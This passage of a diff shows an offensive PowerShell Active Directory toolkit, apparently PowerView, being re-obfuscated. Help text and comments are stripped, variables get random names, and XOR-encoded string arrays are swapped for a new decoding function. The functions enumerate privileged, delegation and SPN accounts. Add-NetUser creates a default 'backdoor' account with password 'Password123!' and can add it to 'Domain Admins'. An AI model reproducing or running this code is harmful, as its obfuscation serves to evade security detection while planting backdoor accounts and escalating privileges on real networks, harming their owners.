-        Switch. Use LDAP queries to determine the domain controllers.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetDomainController -Domain test
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $LDAP
     )
-
     process {
         if($LDAP -or $DomainController) {
-            # filter string to return all domain controllers
             Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
         }
         else {
-            $cYF9amo6 = Get-NetDomain -Domain $Domain
-            
-            if($cYF9amo6) {
-                $cYF9amo6.DomainControllers
+            $zImi = Get-NetDomain -Domain $Domain
+            if($zImi) {
+                $zImi.DomainControllers
             }
         }
     }
 }
-
-
-########################################################
-#
-# "net *" replacements and other fun start below
-#
-########################################################
-
 function Get-NetUser {
-<#
-    .SYNOPSIS
-
-        Query information for a given user or users in the domain
-        using ADSI and LDAP. Another -Domain can be specified to
-        query for users across a trust.
-        Replacement for "net users /domain"
-
-    .PARAMETER UserName
-
-        Username filter string, wildcards accepted.
-
-    .PARAMETER Domain
-
-        The domain to query for users, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER Filter
-
-        A customized ldap filter string to use, e.g. "(description=*admin*)"
-
-    .PARAMETER AdminCount
-
-        Switch. Return users with adminCount=1.
-
-    .PARAMETER SPN
-
-        Switch. Only return user objects with non-null service principal names.
-
-    .PARAMETER Unconstrained
-
-        Switch. Return users that have unconstrained delegation.
-
-    .PARAMETER AllowDelegation
-
-        Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetUser -Domain testing
-
-    .EXAMPLE
-
-        PS C:\> Get-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $UserName,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [String]
         $Filter,
-
         [Switch]
         $SPN,
-
         [Switch]
         $AdminCount,
-
         [Switch]
         $Unconstrained,
-
         [Switch]
         $AllowDelegation,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     begin {
-        # so this isn't repeated if users are passed on the pipeline
-        $Veud = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize
+        $tS3H = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize
     }
-
     process {
-        if($Veud) {
-
-            # if we're checking for unconstrained delegation
+        if($tS3H) {
             if($Unconstrained) {
-                Write-Verbose (HandleResult95 @(159,122,201,95,151,122,213,67,172,37,194,84,148,37,152,74,135,0,247,70,151,122,152,70,173,123,243,74,151,31,205,70,148,31,240,84,148,15,247,64,148,31,197,91,170,15,205,69,172,47,156,14) @(206,72,161,51))
-                $Filter += (HandleResult95 @(106,47,213,139,209,112,60,99,62,177,191,253,76,33,20,87,210,195,178,93,18,105,45,245,147,207,71,14,109,13,202,132,196,108,39,86,43,233,180,243,101,12,116,86,205,152,191,80,58,75,54,246,190,207,105,12,110,13,179,192,198,66,39,88,40,199,150,251) @(33,103,131,241,139,40,118))
+                Write-Verbose (ParseEntry20 @(56,65,206,37,59,103,167,58,11,30,197,46,56,56,234,51,32,59,240,60,59,103,234,63,10,64,244,48,59,2,191,63,51,36,247,46,56,18,133,57,51,36,194,33,6,18,191,60,11,20,155,116) @(105,115,166,73,98,85,211,74))
+                $Filter += (ParseEntry20 @(41,196,48,101,61,252,55,164,59,190,40,105,3,243,72,214,51,190,95,106,3,236,55,144,0,200,9,103,43,206,52,147,45,200,55,104,43,206,56,158,47,246,51,46,41,205,73,158,46,230,55,106,40,224,60,156,45,230,86,46,42,206,44,159,45,200,1,111) @(98,140,102,31,103,164,125,230))
             }
             if($AllowDelegation) {
-                Write-Verbose (HandleResult95 @(65,53,122,72,27,67,95,243,114,106,113,67,24,28,18,250,89,79,68,94,24,41,97,249,89,79,118,75,32,8,105,233,73,80,38,67,27,28,126,228,74,64,68,87,24,38,79,235,116,64,68,79) @(16,7,18,36,66,113,43,131))
-                # negation of "Accounts that are sensitive and not trusted for delegation"
-                $Filter += (HandleResult95 @(16,203,114,255,97,66,21,228,84,251,67,112,2,186,14,161,103,116,9,204,85,162,48,42,56,229,14,227,74,112,30,253,122,249,49,46,21,204,118,229,72,78,30,242,121,196,80,40,23,226,114,229,75,89,111,188,122,212,72,44,11,220,114,231,75,94,60,185,121,234,84,106,16,217,10,173) @(91,136,55,144,5,26))
+                Write-Verbose (ParseEntry20 @(168,245,56,104,73,95,141,183,50,105,115,10,163,170,105,125,89,37,175,189,10,92,90,23,176,143,52,107,114,20,187,173,9,83,36,10,160,170,5,99,74,42,175,180,10,83,116,5,157,128,6,111) @(249,199,80,4,16,109))
+                $Filter += (ParseEntry20 @(29,194,112,65,111,247,79,209,53,234,115,68,82,157,56,140,52,239,103,106,105,157,52,141,53,236,12,93,68,197,68,200,27,232,1,26,69,235,64,200,27,213,112,84,69,251,84,143,26,235,112,91,69,236,53,137,27,197,120,24,91,251,68,202,24,197,82,31,69,213,80,205,29,208,8,19) @(86,129,53,46,11,175,1,189))
             }
             if($AdminCount) {
-                Write-Verbose (HandleResult95 @(172,128,6,73,199,171,178,141,208,3,70,249,195,171,196,203,39,98,216,242,164,170,222,27,116,172,160,247,159,220,63,28,211,200,251,192) @(253,178,110,37,158,153,198))
-                $Filter += (HandleResult95 @(137,243,95,209,128,58,18,14,155,134,32,139,128,3,47,66,143,231,114,135) @(194,180,25,186,226,109,126,123))
+                Write-Verbose (ParseEntry20 @(63,200,245,220,60,46,109,30,152,240,211,2,70,116,87,131,212,247,35,119,123,57,150,232,225,87,37,40,12,148,204,137,40,77,36,83) @(110,250,157,176,101,28,25))
+                $Filter += (ParseEntry20 @(197,229,184,186,236,245,146,164,215,144,199,224,236,204,175,232,195,241,149,236) @(142,162,254,209))
             }
-
-            # check if we're using a username filter or not
             if($UserName) {
-                # samAccountType=805306368 indicates user objects
-                $Veud.filter=((HandleResult95 @(159,241,10,255,195,62,250,160,227,4,222,202,110,143,130,199,55,214,242,57,223,147,231,106,223,228,77,141,153,200,18,162,237,118,229,224,249,0,248,218,85,235,229,240,10,162,238,122,216,131,135,99,196,205,74,200,142,230,99,173) @(212,178,83,144,160,12,188)) + $UserName + ")" + $Filter + ")")
+                $tS3H.filter=((ParseEntry20 @(65,144,29,149,71,46,71,126,130,19,180,78,126,50,92,166,32,188,118,41,98,77,134,125,181,96,93,48,71,169,5,200,105,102,88,62,152,23,146,94,69,86,59,145,29,200,106,106,101,93,230,116,174,73,90,117,80,135,116,199) @(10,211,68,250,36,28,1)) + $UserName + ")" + $Filter + ")")
             }
             elseif($SPN) {
-                $Veud.filter=((HandleResult95 @(151,46,102,58,199,238,43,75,4,243,146,7,93,102,242,169,9,121,7,145,191,42,106,108,235,152,44,14,24,222,157,95,114,47,253,232,38,108,61,222,134,53,117,103,197,139,35,83,0,236,150,29,93,56,234,172,14,120,19,215,136,0,121,33,254,136,93,78,30,245,225,80) @(220,109,63,85,164)) + $Filter + ")")
+                $tS3H.filter=((ParseEntry20 @(38,191,167,91,179,68,199,25,173,169,122,186,20,178,59,137,154,114,130,67,226,42,169,199,123,148,55,176,32,134,191,6,157,12,216,89,183,173,92,170,44,217,39,206,159,99,158,26,212,37,182,142,86,189,56,241,14,187,184,71,132,27,199,25,166,170,4,161,61,208,80,193) @(109,252,254,52,208,118,129)) + $Filter + ")")
             }
             else {
-                # filter is something like "(samAccountName=*blah*)" if specified
-                $Veud.filter=((HandleResult95 @(49,66,55,227,204,35,233,14,80,57,194,197,115,156,44,116,10,202,253,36,204,61,84,87,195,235,80,158,55,123,47,190,226,107,246,78,74,63,177,146) @(122,1,110,140,175,17,175)) + $Filter + ")")
+                $tS3H.filter=((ParseEntry20 @(169,39,71,185,254,66,164,16,79,129,211,26,128,87,72,163,249,54,176,81,125,145,200,73,173,32,95,231,208,10,163,86,83,172,196,68,169,53,35,235) @(226,100,30,214,157,112)) + $Filter + ")")
             }
-
-            $Veud.FindAll() | Where-Object {$_} | ForEach-Object {
-                # convert/process the LDAP fields for each result
+            $tS3H.FindAll() | Where-Object {$_} | ForEach-Object {
                 Convert-LDAPProperty -Properties $_.Properties
             }
         }
     }
 }
-
-
 function Add-NetUser {
-<#
-    .SYNOPSIS
-
-        Adds a domain user or a local user to the current (or remote) machine,
-        if permissions allow, utilizing the WinNT service provider and
-        DirectoryServices.AccountManagement, respectively.
-        
-        The default behavior is to add a user to the local machine.
-        An optional group name to add the user to can be specified.
-
-    .PARAMETER UserName
-
-        The username to add. If not given, it defaults to 'backdoor'
-
-    .PARAMETER Password
-
-        The password to set for the added user. If not given, it defaults to 'Password123!'
-
-    .PARAMETER GroupName
-
-        Group to optionally add the user to.
-
-    .PARAMETER ComputerName
-
-        Hostname to add the local user to, defaults to 'localhost'
-
-    .PARAMETER Domain
-
-        Specified domain to add the user to.
-
-    .EXAMPLE
-
-        PS C:\> Add-NetUser -UserName john -Password 'Password123!'
-        
-        Adds a localuser 'john' to the local machine with password of 'Password123!'
-
-    .EXAMPLE
-
-        PS C:\> Add-NetUser -UserName john -Password 'Password123!' -ComputerName server.testlab.local
-        
-        Adds a localuser 'john' with password of 'Password123!' to server.testlab.local's local Administrators group.
-
-    .EXAMPLE
-
-        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain ''
-        
-        Adds the user "john" with password "password" to the current domain and adds
-        the user to the domain group "Domain Admins"
-
-    .EXAMPLE
-
-        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain 'testing'
-        
-        Adds the user "john" with password "password" to the 'testing' domain and adds
-        the user to the domain group "Domain Admins"
-
-    .Link
-
-        http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
-#>
-
     [CmdletBinding()]
     Param (
         [ValidateNotNullOrEmpty()]
         [String]
         $UserName = 'backdoor',
-
         [ValidateNotNullOrEmpty()]
         [String]
         $Password = 'Password123!',
-
         [ValidateNotNullOrEmpty()]
         [String]
         $GroupName,
-
         [ValidateNotNullOrEmpty()]
         [Alias('HostName')]
         [String]
         $ComputerName = 'localhost',
-
         [ValidateNotNullOrEmpty()]
         [String]
         $Domain
     )
-
     if ($Domain) {
-
-        $n5RRH = Get-NetDomain -Domain $Domain
-        if(-not $n5RRH) {
-            Write-Warning ((HandleResult95 @(230,81,216,198,74,40,90,211,104,197,139,79,65,32,254,97,203,210,98,107,113,217,106,245) @(180,9,146,191,40,27,19)) + $Domain + (HandleResult95 @(131,90,202,243,37,32,16,138,174,92,206,167) @(202,29,243,154,68,77,70,224)))
+        $iBN07 = Get-NetDomain -Domain $Domain
+        if(-not $iBN07) {
+            Write-Warning ((ParseEntry20 @(21,227,183,62,86,26,14,220,156,16,0,78,29,136,183,47,109,68,13,203,159,42,87,78) @(71,187,253,71,52,41)) + $Domain + (ParseEntry20 @(166,106,252,111,200,199,130,232,139,108,248,59) @(239,45,197,6,169,170,212,130)))
             return $Null
         }
-
-        # add the assembly we need
         Add-Type -AssemblyName System.DirectoryServices.AccountManagement
-
-        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
-        # get the domain context
-        $DyfM = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $n5RRH
-
-        # create the user object
-        $m342PSR = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $DyfM
-
-        # set user properties
-        $m342PSR.Name = $UserName
-        $m342PSR.SamAccountName = $UserName
-        $m342PSR.PasswordNotRequired = $False
-        $m342PSR.SetPassword($Password)
-        $m342PSR.Enabled = $True
-
-        Write-Verbose ((HandleResult95 @(234,99,217,62,183,231,252,135,217,61,240,53,138,231,224,155,216,57,210,111) @(187,80,147,82,238,191,174,247)) + $UserName + (HandleResult95 @(110,26,201,4,110,26,255,2,67,21,252,21,68,21,221,8,68,97,255,4,68,63,202,21,109,37,166,79) @(39,82,155,114)) + $Password + (HandleResult95 @(89,161,61,126,113,177,61,101,113,234,78,102,114,143,75,105) @(19,216,127,14)) + $Domain)
-
+        $uIRv = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $iBN07
+        $qzuM = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $uIRv
+        $qzuM.Name = $UserName
+        $qzuM.SamAccountName = $UserName
+        $qzuM.PasswordNotRequired = $False
+        $qzuM.SetPassword($Password)
+        $qzuM.Enabled = $True
+        Write-Verbose ((ParseEntry20 @(75,240,105,67,6,66,145,83,77,50,121,164,71,119,17,118,160,74,110,98) @(26,195,35,47,95)) + $UserName + (ParseEntry20 @(98,231,228,190,192,110,79,223,210,143,238,65,72,232,240,178,234,21,79,217,213,165,216,65,97,216,139,245) @(43,175,182,200,137,38)) + $Password + (ParseEntry20 @(47,201,214,125,50,47,39,219,246,63,97,46,4,231,160,106) @(101,176,148,13,80,70)) + $Domain)
         try {
-            # commit the user
-            $m342PSR.Save()
-            ((HandleResult95 @(50,93,49,55,44,98,23,41,63,124,8,52) @(101,36,65,83)) + $UserName + (HandleResult95 @(149,93,105,46,70,238,91,75,124,44,146,120,67,72,103,175,112,116,93,117,191,120,113,119,123,155,67,76,86,88,176,96,110,88,77,170,119,112,89,111,190,124,102,34) @(220,21,39,31,31)) + $Domain)
+            $qzuM.Save()
+            ((ParseEntry20 @(111,36,235,200,62,126,11,225,246,47,113,58) @(56,93,155,172,119)) + $UserName + (ParseEntry20 @(127,170,55,145,194,4,172,21,195,168,120,143,29,247,227,69,135,42,226,241,85,143,47,200,255,113,180,18,233,220,90,151,48,231,201,64,128,46,230,235,84,139,56,157) @(54,226,121,160,155)) + $Domain)
         }
         catch {
             Write-Warning '[!] User already exists!'
@@ -2277,401 +1202,191 @@ function Add-NetUser {
         }
     }
     else {
-        
-        Write-Verbose ((HandleResult95 @(244,219,2,197,182,188,8,0,199,133,43,206,139,188,20,28,198,129,9,148) @(165,232,72,169,239,228,90,112)) + $UserName + (HandleResult95 @(230,196,200,247,230,196,254,241,203,203,253,230,204,203,220,251,204,191,254,247,204,225,203,230,229,251,167,188) @(175,140,154,129)) + $Password + (HandleResult95 @(230,66,179,184,206,82,176,243) @(172,59,241,206)) + $ComputerName)
-
-        # if it's not a domain add, it's a local machine add
-        $d7ztB5J = [ADSI]((HandleResult95 @(220,214,160,7,222,136,157,68,198,157,244,79) @(138,228,204,114)) + $ComputerName)
-        $aQmp = $d7ztB5J.Create('User', $UserName)
-        $aQmp.SetPassword($Password)
-
-        # commit the changes to the local machine
+        Write-Verbose ((ParseEntry20 @(229,182,102,112,237,221,126,108,214,232,79,123,208,221,98,112,215,236,109,33) @(180,133,44,28)) + $UserName + (ParseEntry20 @(145,196,216,228,12,144,232,250,246,2,191,235,233,213,3,162,239,185,246,51,187,225,219,245,15,175,177,183) @(216,140,138,146,69)) + $Password + (ParseEntry20 @(77,182,24,193,101,166,27,138) @(7,207,90,183)) + $ComputerName)
+        $adn3Dd = [ADSI]((ParseEntry20 @(219,133,210,249,161,46,220,129,242,245,205,127) @(141,183,190,140,245,66)) + $ComputerName)
+        $YNiE = $adn3Dd.Create('User', $UserName)
+        $YNiE.SetPassword($Password)
         try {
-            $Null = $aQmp.SetInfo()
-            ((HandleResult95 @(178,76,252,111,172,115,218,113,191,109,197,108) @(229,53,140,11)) + $UserName + (HandleResult95 @(81,29,235,150,159,245,117,115,123,102,235,202,162,144,67,108,125,6,231,205,165,170,109,119,124,18,243,204,143,128,2,106,81,18,205,209,165,244,106,120) @(24,85,165,167,198,199,59,31)) + $ComputerName)
+            $Null = $YNiE.SetInfo()
+            ((ParseEntry20 @(71,24,46,249,141,86,55,36,199,156,89,6) @(16,97,94,157,196)) + $UserName + (ParseEntry20 @(128,17,60,76,237,20,149,165,58,65,51,217,66,140,177,42,23,46,246,76,184,164,15,26,25,243,112,176,128,30,75,8,253,97,179,191,58,65,44,211) @(201,89,114,125,180,38,219)) + $ComputerName)
         }
         catch {
             Write-Warning '[!] Account already exists!'
             return
         }
     }
-
-    # if a group is specified, invoke Add-NetGroupUser and return its value
     if ($GroupName) {
-        # if we're adding the user to a domain
         if ($Domain) {
             Add-NetGroupUser -UserName $UserName -GroupName $GroupName -Domain $Domain
-            ((HandleResult95 @(62,114,0,168,25,16,40,19,81,40,133,55) @(105,11,112,204,80,86,126)) + $UserName + (HandleResult95 @(135,252,24,222,151,134,24,131,173,135,24,130,170,227,46,156,171,231,20,135,148,243,4,131,148,247,20,223,172,205,20,129,173,217,111,222,173,247,23,210) @(206,180,86,239)) + $GroupName + (HandleResult95 @(35,36,124,74,149,45,49,102,93,139,44,19,114,86,157,87) @(106,99,16,63,220)) + $Domain)
+            ((ParseEntry20 @(235,122,105,232,236,250,85,99,214,253,245,100) @(188,3,25,140,165)) + $UserName + (ParseEntry20 @(172,101,34,66,140,209,110,98,134,30,34,30,177,180,88,125,128,126,46,27,143,164,114,98,191,110,46,67,183,154,98,96,134,64,85,66,182,160,97,51) @(229,45,108,115,213,227,32,14)) + $GroupName + (ParseEntry20 @(3,37,111,251,19,13,48,117,236,13,12,18,97,231,27,119) @(74,98,3,142,90)) + $Domain)
         }
-        # otherwise, we're adding to a local group
         else {
             Add-NetGroupUser -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
-            ((HandleResult95 @(68,129,139,102,90,190,173,120,73,160,178,101) @(19,248,251,2)) + $UserName + (HandleResult95 @(22,214,7,99,6,172,7,62,60,173,7,63,59,201,49,33,58,205,11,58,5,217,27,62,5,221,11,98,61,231,11,60,60,243,112,99,60,221,8,111) @(95,158,73,82)) + $GroupName + (HandleResult95 @(228,193,223,36,9,172,61,219,229,213,0,39) @(173,134,230,81,64,235,85)) + $ComputerName)
+            ((ParseEntry20 @(147,209,65,184,141,238,103,166,158,240,120,187) @(196,168,49,220)) + $UserName + (ParseEntry20 @(246,219,124,226,27,112,160,186,220,160,124,190,38,21,150,165,218,192,112,187,24,5,188,186,229,208,112,227,32,59,172,184,220,254,11,226,33,1,175,235) @(191,147,50,211,66,66,238,214)) + $GroupName + (ParseEntry20 @(108,87,2,134,56,98,120,77,144,66,116,119) @(37,16,59,243,113)) + $ComputerName)
         }
     }
 }
-
-
 function Add-NetGroupUser {
-<#
-    .SYNOPSIS
-
-        Adds a user to a domain group or a local group on the current (or remote) machine,
-        if permissions allow, utilizing the WinNT service provider and
-        DirectoryServices.AccountManagement, respectively.
-
-    .PARAMETER UserName
-
-        The domain username to query for.
-
-    .PARAMETER GroupName
-
-        Group to add the user to.
-
-    .PARAMETER ComputerName
-
-        Hostname to add the user to, defaults to localhost.
-
-    .PARAMETER Domain
-
-        Domain to add the user to.
-
-    .EXAMPLE
-
-        PS C:\> Add-NetGroupUser -UserName john -GroupName Administrators
-        
-        Adds a localuser "john" to the local group "Administrators"
-
-    .EXAMPLE
-
-        PS C:\> Add-NetGroupUser -UserName john -GroupName "Domain Admins" -Domain dev.local
-        
-        Adds the existing user "john" to the domain group "Domain Admins" in "dev.local"
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
         $UserName,
-
         [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
         $GroupName,
-
         [ValidateNotNullOrEmpty()]
         [Alias('HostName')]
         [String]
         $ComputerName,
-
         [String]
         $Domain
     )
-
-    # add the assembly if we need it
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement
-
-    # if we're adding to a remote host's local group, use the WinNT provider
-    if($ComputerName -and ($ComputerName -ne (HandleResult95 @(170,204,55,227,7,40,229,167,233,61,199,110) @(200,139,14,137,94,127,157)))) {
+    if($ComputerName -and ($ComputerName -ne (ParseEntry20 @(74,180,47,159,40,127,139,121,151,66,102,195) @(40,243,22,245,113)))) {
         try {
-            Write-Verbose ((HandleResult95 @(148,28,189,9,152,252,240,37,166,42,175,209,159,19,166,5) @(197,75,239,98,249,171)) + $UserName + (HandleResult95 @(81,107,238,16,22,89,30,129) @(24,35,188,102,95)) + $GroupName + (HandleResult95 @(94,116,104,182,130,80,91,39,160,248,70,84) @(23,51,81,195,203)) + $ComputerName)
-            ([ADSI]((HandleResult95 @(151,143,197,201,104,184,149,23,141,196,145,129) @(193,189,169,188,60,212,196,33)) + $ComputerName + "/" + $GroupName + (HandleResult95 @(211,208,17,88,253,164,35,86) @(159,151,117,33)))).add(((HandleResult95 @(203,255,168,40,107,160,196,230,209,180,252,96) @(157,205,196,93,63,204,149,208)) + $ComputerName + "/" + $UserName + (HandleResult95 @(247,51,204,121,225,35,211,62) @(187,123,154,3))))
-            ((HandleResult95 @(202,194,14,120,9,219,237,4,70,24,212,220) @(157,187,126,28,64)) + $UserName + (HandleResult95 @(68,153,225,242,72,63,159,195,160,34,67,188,203,148,105,126,180,252,129,121,87,150,253,175,75,78,147,159,161,104,79,191,204,174,40,60,178,236,130,44) @(13,209,175,195,17)) + $GroupName + (HandleResult95 @(107,134,23,206,190,186,244,245) @(34,193,46,187,247,251,201,200)) + $ComputerName)
+            Write-Verbose ((ParseEntry20 @(148,76,172,173,164,76,203,168,140,83,168,188,159,67,183,161) @(197,27,254,198)) + $UserName + (ParseEntry20 @(246,126,142,168,146,23,37,130) @(191,54,220,222,219,86,24)) + $GroupName + (ParseEntry20 @(229,209,149,168,203,72,247,218,245,159,140,229) @(172,150,172,221,130,15,159)) + $ComputerName)
+            ([ADSI]((ParseEntry20 @(53,162,58,111,194,186,22,85,220,47,34,171) @(99,144,86,26,150,214,71)) + $ComputerName + "/" + $GroupName + (ParseEntry20 @(159,51,118,98,109,194,33,164) @(211,116,18,27,15,241,119)))).add(((ParseEntry20 @(110,112,200,123,108,46,245,56,116,59,156,51) @(56,66,164,14)) + $ComputerName + "/" + $UserName + (ParseEntry20 @(161,154,19,68,2,181,155,120) @(237,210,69,62,88))))
+            ((ParseEntry20 @(58,109,40,230,188,54,67,23,78,0,203,146) @(109,20,88,130,245,112,21)) + $UserName + (ParseEntry20 @(72,101,226,90,67,51,99,192,8,41,79,64,200,60,98,114,72,255,41,114,91,106,254,7,64,66,111,156,9,99,67,67,207,6,35,48,78,239,42,39) @(1,45,172,107,26)) + $GroupName + (ParseEntry20 @(103,134,50,102,155,101,19,252) @(46,193,11,19,210,36)) + $ComputerName)
         }
         catch {
-            Write-Warning ((HandleResult95 @(241,30,197,22,85,104,65,78,197,10,186,11,85,106,81,92,252,32,239,7,70,84,85,6,197,85,213,11,85,108,42,10) @(166,103,131,114,28,45,23,55)) + $UserName + (HandleResult95 @(174,45,38,105,0,226,243,125,133,86,34,104,0,228,170,57) @(231,101,116,31,73,165,151,4)) + $GroupName + (HandleResult95 @(24,51,65,199,53,206,129,108) @(81,116,120,178,124,143,188)) + $ComputerName)
+            Write-Warning ((ParseEntry20 @(12,135,17,96,254,237,45,22,56,147,110,125,254,239,61,4,1,185,59,113,237,209,57,94,56,204,1,125,254,233,70,82) @(91,254,87,4,183,168,123,111)) + $UserName + (ParseEntry20 @(132,12,54,143,198,192,169,61,6,202,217,240,132,5,89,196) @(205,68,100,249,143,135)) + $GroupName + (ParseEntry20 @(70,169,107,148,80,17,50,211) @(15,238,82,225,25,80)) + $ComputerName)
             return
         }
     }
-
-    # otherwise it's a local machine or domain add
     else {
         try {
             if ($Domain) {
-                Write-Verbose ((HandleResult95 @(23,28,254,169,116,17,126,194,139,93,16,49,246,154,92,33) @(70,75,172,194,21)) + $UserName + (HandleResult95 @(113,158,4,30,113,151,107,85) @(56,214,86,104)) + $GroupName + (HandleResult95 @(94,178,156,35,26,122,69,131,199,1,21,77,117,156,228,107) @(23,245,165,86,83,61)) + $Domain)
-                $D7tgKeZb = [System.DirectoryServices.AccountManagement.ContextType]::Domain
-                $n5RRH = Get-NetDomain -Domain $Domain
-                if(-not $n5RRH) {
+                Write-Verbose ((ParseEntry20 @(249,186,15,22,181,114,204,198,164,21,43,174,127,161,225,138) @(168,237,93,125,212,37,249)) + $UserName + (ParseEntry20 @(228,175,25,135,175,178,115,109) @(173,231,75,241,230,243,78,80)) + $GroupName + (ParseEntry20 @(145,58,37,89,145,58,78,90,186,42,90,92,186,20,93,17) @(216,125,28,44)) + $Domain)
+                $NAR8E = [System.DirectoryServices.AccountManagement.ContextType]::Domain
+                $iBN07 = Get-NetDomain -Domain $Domain
+                if(-not $iBN07) {
                     return $Null
                 }
-                # get the full principal context
-                $DyfM = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $D7tgKeZb, $n5RRH            
+                $uIRv = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $NAR8E, $iBN07            
             }
             else {
-                # otherwise, get the local machine context
-                Write-Verbose ((HandleResult95 @(226,190,254,176,52,228,220,194,146,29,229,147,246,131,28,212) @(179,233,172,219,85)) + $UserName + (HandleResult95 @(169,141,246,82,169,132,153,25) @(224,197,164,36)) + $GroupName + (HandleResult95 @(40,65,60,95,40,65,125,92,56,52,67,89,0,65,60,80,5,71,56,23) @(97,6,5,42)))
-                $DyfM = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
+                Write-Verbose ((ParseEntry20 @(100,61,247,16,131,163,106,91,35,237,45,152,174,7,124,13) @(53,106,165,123,226,244,95)) + $UserName + (ParseEntry20 @(165,65,102,79,250,130,209,52) @(236,9,52,57,179,195)) + $GroupName + (ParseEntry20 @(214,88,234,213,159,30,231,105,138,146,144,42,254,88,234,218,178,24,162,34) @(159,31,211,160,214,89)))
+                $uIRv = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
             }
-
-            # find the particular group
-            $ayFBYTwN = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($DyfM,$GroupName)
-
-            # add the particular user to the group
-            $ayFBYTwN.Members.add($DyfM, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)
-
-            # commit the changes
-            $ayFBYTwN.Save()
+            $tDwvKLfV = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($uIRv,$GroupName)
+            $tDwvKLfV.Members.add($uIRv, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)
+            $tDwvKLfV.Save()
         }
         catch {
-            Write-Warning ((HandleResult95 @(68,91,15,166,172,158,28,105,79,84,23,180,175,250,96,96,95,66,120,226) @(22,3,69,223,206,173,85,14)) + $UserName + (HandleResult95 @(143,93,168,82,143,84,199,25) @(198,21,250,36)) + $GroupName + (HandleResult95 @(30,21,219,28) @(87,81,180,123,254)) + $_)
+            Write-Warning ((ParseEntry20 @(148,44,132,197,165,148,136,161,45,153,238,172,198,150,243,26,135,253,250,154) @(198,116,206,188,199,167,193)) + $UserName + (ParseEntry20 @(195,50,48,204,83,19,243,183) @(138,122,98,186,26,82,206)) + $GroupName + (ParseEntry20 @(68,96,128,32) @(13,36,239,71,176,173)) + $_)
         }
     }
 }
-
-
 function Get-UserProperty {
-<#
-    .SYNOPSIS
-
-        Returns a list of all user object properties. If a property
-        name is specified, it returns all [user:property] values.
-
-        Taken directly from @obscuresec's post:
-            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
-
-    .PARAMETER Properties
-
-        Property names to extract for users.
-
-    .PARAMETER Domain
-
-        The domain to query for user properties, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-UserProperty -Domain testing
-        
-        Returns all user properties for users in the 'testing' domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-UserProperty -Properties ssn,lastlogon,location
-        
-        Returns all an array of user/ssn/lastlogin/location combinations
-        for users in the current domain.
-
-    .LINK
-
-        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
-#>
-
     [CmdletBinding()]
     param(
         [String[]]
         $Properties,
-
         [String]
         $Domain,
-        
         [String]
         $DomainController,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     if($Properties) {
-        # extract out the set of all properties for each object
-        $Properties = ,(HandleResult95 @(66,181,233,20,59,157,118,29) @(32,216,175,96,97,204,75)) + $Properties
+        $Properties = ,(ParseEntry20 @(129,97,13,69,185,93,118,12) @(227,12,75,49)) + $Properties
         Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -Property $Properties
     }
     else {
-        # extract out just the property names
         Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'
     }
 }
-
-
 function Find-UserField {
-<#
-    .SYNOPSIS
-
-        Searches user object fields for a given word (default *pass*). Default
-        field being searched is 'description'.
-
-        Taken directly from @obscuresec's post:
-            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
-
-    .PARAMETER SearchTerm
-
-        Term to search for, default of "pass".
-
